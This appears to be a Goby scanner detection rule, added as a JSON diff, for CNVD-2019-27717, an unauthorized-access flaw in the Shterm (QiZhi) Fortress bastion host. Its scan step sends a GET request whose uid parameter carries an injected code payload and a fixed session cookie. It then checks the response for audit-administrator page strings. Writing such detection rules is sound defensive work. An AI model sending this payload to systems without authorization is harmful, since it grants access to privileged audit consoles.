@@ -1,0 +1,75 @@
+{
+      "Name": "Shterm(QiZhi) Fortress Unauthorized Access CNVD-2019-27717",
+      "Level": "1",
+      "Tags": [
+            "Unauthorized Access"
+      ],
+      "GobyQuery": "app=\"shterm-Fortres-Machine\"",
+      "Description": "Zhejiang Qizhi Technology Co., Ltd. is a company mainly engaged in technical development of computer software and hardware, network products and other projects.",
+      "Product": "shterm(QiZhi) Fortress ",
+      "Homepage": "https://www.shterm.com/",
+      "Author": "",
+      "Impact": "Shterm(QiZhi) Fortress Unauthorized Access CNVD-2019-27717",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2019-27717"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "PHPSESSID=4uh4l0e3b0fd28d27l71u5be36"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "错误的id",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "审计管理员",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "事件审计",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
